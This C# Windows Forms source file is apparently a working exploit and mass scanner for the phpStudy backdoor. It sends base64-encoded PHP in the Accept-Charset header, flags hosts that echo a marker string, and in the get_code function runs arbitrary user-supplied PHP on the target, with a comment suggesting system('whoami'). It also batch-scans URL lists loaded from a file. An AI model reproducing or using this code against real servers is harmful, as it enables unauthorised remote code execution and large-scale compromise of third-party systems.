using HttpCodeLib;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace phpStudy_Scan
{
    public partial class Form1 : Form
    {
        public string flag;

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (this.textBox1.Text == "")
            {
                MessageBox.Show("No Url");
            }
            else
            {
                HttpHelpers httpHelpers = new HttpHelpers();
                HttpItems httpItems = new HttpItems();
                HttpResults httpResults = new HttpResults();
                httpItems.URL = this.textBox1.Text;
                httpItems.Timeout = 5000;
                httpItems.Accept = "*/*";
                httpItems.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)";
                httpItems.ContentType = "application/x-www-form-urlencoded";
                httpItems.Header.Add("Accept-Encoding", "gzip,deflate");
                httpItems.Header.Add("Accept-Charset", "cHJpbnQoIkEtWkBRQVFAMC05Lk9LIik7");
                httpItems.Method = "Get";
                httpResults = httpHelpers.GetHtml(httpItems);
                if (httpResults.Html.Contains("A-Z@QAQ@0-9.OK"))
                {
                    MessageBox.Show("Target Has Vul");
                }
                else
                {
                    MessageBox.Show("No Vul");
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //system("whoami");
            if (this.textBox1.Text == "")
            {
                MessageBox.Show("No Url");
            }
            else if (this.textBox2.Text == "")
            {
                MessageBox.Show("No Code");
            }
            else
            {
                HttpHelpers httpHelpers = new HttpHelpers();
                HttpItems httpItems = new HttpItems();
                HttpResults httpResults = new HttpResults();
                httpItems.URL = this.textBox1.Text;
                httpItems.Timeout = 5000;
                httpItems.Accept = "*/*";
                httpItems.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)";
                httpItems.ContentType = "application/x-www-form-urlencoded";
                httpItems.Header.Add("Accept-Encoding", "gzip,deflate");
                httpItems.Header.Add("Accept-Charset", "cHJpbnQoIkEtWkBRQVFAMC05Lk9LIik7");
                httpItems.Method = "Get";
                httpResults = httpHelpers.GetHtml(httpItems);
                if (httpResults.Html.Contains("A-Z@QAQ@0-9.OK"))
                {
                    get_code();
                }
                else
                {
                    MessageBox.Show("No Vul");
                }
                
            }
        }

        public void get_code()
        {
            byte[] bytes = Encoding.GetEncoding("gb2312").GetBytes(this.textBox2.Text);
            string value = Convert.ToBase64String(bytes);
            HttpHelpers httpHelpers = new HttpHelpers();
            HttpItems httpItems = new HttpItems();
            HttpResults httpResults = new HttpResults();
            httpItems.URL = this.textBox1.Text;
            httpItems.Timeout = 5000;
            httpItems.Accept = "*/*";
            httpItems.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)";
            httpItems.ContentType = "application/x-www-form-urlencoded";
            httpItems.Header.Add("Accept-Encoding", "gzip,deflate");
            httpItems.Header.Add("Accept-Charset", value);
            httpItems.Method = "Get";
            httpResults = httpHelpers.GetHtml(httpItems);
            string html = httpResults.Html;
            this.textBox3.Text = html;
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            this.listView1.Items.Clear();
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                if (ofd.FileName != "")
                {
                    StreamReader sr = new StreamReader(ofd.FileName);
                    List<ListViewItem> items = new List<ListViewItem>();
                    while (true)
                    {
                        string line = sr.ReadLine();
                        if (line == null)
                        {
                            break;
                        }
                        if (line.Equals(""))
                        {
                            continue;
                        }

                        String url = line.Trim();
                        ListViewItem lvi = new ListViewItem();
                        lvi.SubItems[0].Text = Convert.ToString(listView1.Items.Count + 1);
                        lvi.SubItems.Add(url);
                        lvi.SubItems.Add("Null");
                        lvi.SubItems.Add("0");
                        items.Add(lvi);
                        if (items.Count > 100)
                        {
                            listView1.Items.AddRange(items.ToArray());
                            items.Clear();
                        }
                    }
                    if (items.Count > 0)
                    {
                        listView1.Items.AddRange(items.ToArray());
                    }
                    sr.Close();
                    resetListViewIndex(listView1);
                }
            }
        }

        private void resetListViewIndex(ListView listView)
        {
            for (int i = 0; i < listView.Items.Count; i++)
            {

                if (Convert.ToInt32(listView.Items[i].SubItems[0].Text) == i + 1)
                {
                    continue;
                }
                listView.Items[i].SubItems[0].Text = Convert.ToString(i + 1);
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            if (this.listView1.Items.Count < 1)
            {
                return;
            }
            else
            {
                Thread batchPoolThread = new Thread(batchPool);
                batchPoolThread.Start();
            }
            
        }

        private void batchPool() 
        {
            for (int i = 0; i < this.listView1.Items.Count; i++)
            {
                try
                {
                    string url = this.listView1.Items[i].SubItems[1].Text;
                    HttpHelpers httpHelpers = new HttpHelpers();
                    HttpItems httpItems = new HttpItems();
                    HttpResults httpResults = new HttpResults();
                    httpItems.URL = url;
                    httpItems.Timeout = 5000;
                    httpItems.Accept = "*/*";
                    httpItems.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)";
                    httpItems.ContentType = "application/x-www-form-urlencoded";
                    httpItems.Header.Add("Accept-Encoding", "gzip,deflate");
                    httpItems.Header.Add("Accept-Charset", "cHJpbnQoIkEtWkBRQVFAMC05Lk9LIik7");
                    httpItems.Method = "Get";
                    httpResults = httpHelpers.GetHtml(httpItems);
                    if (httpResults.Html.Contains("A-Z@QAQ@0-9.OK"))
                    {
                        flag = "1";
                        //MessageBox.Show("Target Has Vul");
                    }
                    else
                    {
                        flag = "0";
                        //MessageBox.Show("No Vul");
                    }
                }
                catch { }
                finally
                {
                    if (flag == "1")
                    {
                        this.listView1.Items[i].ForeColor = Color.DarkGray;
                        this.listView1.Items[i].SubItems[2].Text = "Has Vul";
                        this.listView1.Items[i].SubItems[3].Text = "1";
                        //MessageBox.Show("Target Has Vul");
                    }
                    else
                    {
                        this.listView1.Items[i].ForeColor = Color.DarkGray;
                        this.listView1.Items[i].SubItems[2].Text = "No Vul";
                        this.listView1.Items[i].SubItems[3].Text = "1";
                        //MessageBox.Show("No Vul");
                    }
                    Thread.Sleep(1);
                }
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetDataObject(this.listView1.SelectedItems[0].SubItems[1].Text);
            }
            catch
            {
            }
        }

        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".txt";
            if (sfd.FileName != "" && sfd.ShowDialog() == DialogResult.OK)
            {
                sfd.RestoreDirectory = true;
                sfd.CreatePrompt = true;
                StreamWriter sw = File.CreateText(sfd.FileName);
                for (int i = 0; i < this.listView1.Items.Count; i++)
                {
                    try
                    {
                        string line = i.ToString();
                        line += ("|" + this.listView1.Items[i].SubItems[1].Text);
                        if (String.IsNullOrEmpty(this.listView1.Items[i].SubItems[2].Text))
                        {
                            line += ("|" + "null");
                        }
                        else
                        {
                            line += ("|" + this.listView1.Items[i].SubItems[2].Text);
                        }
                        if (String.IsNullOrEmpty(this.listView1.Items[i].SubItems[3].Text))
                        {
                            line += ("|" + "null");
                        }
                        else
                        {
                            line += ("|" + this.listView1.Items[i].SubItems[3].Text);
                        }
                        sw.WriteLine(line);
                    }
                    catch { }
                }
                sw.Close();
                MessageBox.Show("Save Success!");
            }
        }

        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            DialogResult r = MessageBox.Show("确定要清空文本吗?", "", MessageBoxButtons.YesNo);
            if (r == DialogResult.Yes)
            {
                this.listView1.Items.Clear();
            }
        }
    }
}
